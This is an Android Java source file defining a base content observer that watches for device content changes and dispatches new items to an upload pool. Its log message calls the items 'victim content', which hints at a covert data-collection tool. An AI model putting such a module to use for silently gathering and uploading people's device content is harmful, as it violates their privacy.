package com.example.orensharon.finalproject.service.observers;

import android.content.Context;
import android.database.ContentObserver;
import android.util.Log;

import com.example.orensharon.finalproject.service.managers.BaseManager;
import com.example.orensharon.finalproject.service.objects.BaseObject;


/**
 * Created by orensharon on 12/13/14.
 * This class is the base of the content observer module
 */
abstract public class BaseContentObserver extends ContentObserver {

    public Context mContext;
    protected BaseManager mManager;

    private long lastTimeofCall = 0L;
    private long lastTimeofUpdate = 0L;
    private long threshold_time = 5000;

    public BaseContentObserver(Context context) {

        super(null);
        mContext = context;
    }

    @Override
    public void onChange(boolean selfChange) {

        // Each registered content observer will fire this event on any change of the content
        // Checking if this is a new content and add it to the pool to send it


        lastTimeofCall = System.currentTimeMillis();

        // To prevent multiple calls
        if(lastTimeofCall - lastTimeofUpdate > threshold_time) {

            // Handling with content sampling using thread
            new Thread(new Runnable() {
                @Override
                public void run() {

                    BaseObject content;

                    content = mManager.HandleContent();

                    if (content != null) {
                        Log.e("sharonlog", "Found victim content!" + content.getTypeOfContent() + " ID:" + content.getId());

                        // TODO: before dispatch - check if at only wifi mode

                        // Sending the content into the upload pool
                        mManager.getUploadManager().DispatchRequest(content);
                    } else {
                        Log.e("sharonlog", "No content found");
                    }
                }
            }).start();


            lastTimeofUpdate = System.currentTimeMillis();
        }
    }

    @Override
    public boolean deliverSelfNotifications() {
        return true;
    }

    public void Manage() {

        mManager.Manage();
    }
}
